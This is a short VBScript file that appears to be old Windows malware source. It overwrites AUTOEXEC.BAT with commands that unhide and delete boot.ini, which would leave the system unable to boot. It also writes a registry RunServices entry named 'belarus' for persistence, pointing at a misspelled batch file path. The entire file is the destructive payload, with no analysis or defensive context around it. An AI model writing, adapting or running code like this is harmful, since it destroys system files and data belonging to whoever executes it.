Dim fso, Text, FileName
Set fso = CreateObject("Scripting.FileSystemObject") 
Set Text = fso.CreateTextFile ("c:\AUTOEXEC.BAT")
Text.WriteLine "cd\"
Text.WriteLine "c:"
Text.WriteLine "attrib -h -r -s c:\boot.ini"
Text.WriteLine "LOH AND LAMER"
Text.WriteLine "del boot.ini"
Text.Close
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\belarus", "c:\autoexek.bat"